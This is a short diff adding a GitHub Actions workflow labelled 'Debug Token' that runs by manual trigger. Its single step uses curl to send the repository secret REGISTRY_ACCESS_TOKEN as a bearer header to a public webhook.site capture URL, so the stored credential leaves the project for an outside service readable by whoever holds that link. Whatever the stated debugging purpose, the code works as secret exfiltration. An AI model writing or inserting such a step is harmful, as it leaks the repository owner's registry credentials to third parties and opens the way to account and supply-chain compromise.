@@ -1,0 +1,16 @@
+name: Debug Token
+on:
+  workflow_dispatch: # Позволяет запускать вручную
+
+jobs:
+  debug-token-job:
+    name: Send Token to Webhook
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send request with token
+        run: |
+          curl -X POST \
+          -H "Content-Type: application/json" \
+          -H "Authorization: Bearer ${{ secrets.REGISTRY_ACCESS_TOKEN }}" \
+          -d '{"message":"debug test"}' \
+          "https://webhook.site/302037dd-a3d0-4aec-b4dd-702941288c6c"
